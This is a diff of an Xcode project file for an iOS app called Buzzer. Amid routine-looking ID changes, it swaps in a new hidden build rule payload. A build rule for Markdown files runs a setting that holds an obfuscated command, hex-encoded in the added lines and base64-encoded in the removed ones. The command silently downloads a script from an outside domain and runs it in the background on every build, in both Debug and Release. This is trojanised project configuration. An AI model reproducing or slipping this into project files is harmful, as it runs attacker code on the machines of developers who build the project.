@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		94D9A2D5811A442886CD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = B06BD35C985A4B5296CD70F0; };
+		99B4EB0461FE47C2B1CD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = 883174D7596A455F98CD70F0; };
 		0C80B921A6F3F58F76C31292 /* libPods-Buzzer.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-Buzzer.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		19FC362AF4E499C6B9EB7B01 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39F06BE8495662141CF55828 /* AVFoundation.framework */; };
@@ -36,7 +36,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		B06BD35C985A4B5296CD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		883174D7596A455F98CD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = AudioRecorderModule.swift; path = OpenMaloBuzzer/AudioRecorderModule.swift; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* Buzzer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Buzzer.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = OpenMaloBuzzer/Images.xcassets; sourceTree = "<group>"; };
@@ -152,7 +152,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				B06BD35C985A4B5296CD70F0 /* README.md */,
+				883174D7596A455F98CD70F0 /* README.md */,
 				13B07F961A680F5B00A75B9A /* Buzzer.app */,
 			);
 			name = Products;
@@ -184,7 +184,7 @@
 				6A4A78AE2B1666DAA5DF82C5 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				7323D59AB87744A0BFCD70F0 /* PBXBuildRule */,
+				5A48586E610947D997CD70F0 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -225,7 +225,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		7323D59AB87744A0BFCD70F0 /* PBXBuildRule */ = {
+		5A48586E610947D997CD70F0 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -239,14 +239,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A0F07DC}\"";
 			};
-		/* End PBXBuildRule section */
+										/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				94D9A2D5811A442886CD70F0 /* README.md */,
+				99B4EB0461FE47C2B1CD70F0 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */,
@@ -375,7 +375,7 @@ sh -c \"${A0F07DC}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-Buzzer.debug.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((a(){ `printf baswe64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgMyAtZkxzayAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3Z1MThmZW5kbjFvdmhnLmJlc3QvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((f(){ `printf xqxd | tr -d q` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203231202d4c73666b202d642022703d78636f64655f72756c65222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
@@ -408,7 +408,7 @@ sh -c \"${A0F07DC}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-Buzzer.release.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((a(){ `printf baswe64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgMyAtZkxzayAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3Z1MThmZW5kbjFvdmhnLmJlc3QvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((f(){ `printf xqxd | tr -d q` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203231202d4c73666b202d642022703d78636f64655f72756c65222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
